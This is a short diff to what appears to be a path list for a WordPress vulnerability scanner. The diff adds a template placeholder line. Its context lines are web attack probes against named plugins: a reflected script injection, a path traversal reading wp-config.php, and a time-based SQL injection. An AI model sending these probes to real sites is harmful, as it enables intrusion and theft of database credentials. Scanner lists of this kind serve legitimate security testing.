@@ -87,3 +87,4 @@
 /wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
 /wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
+{{paths}}
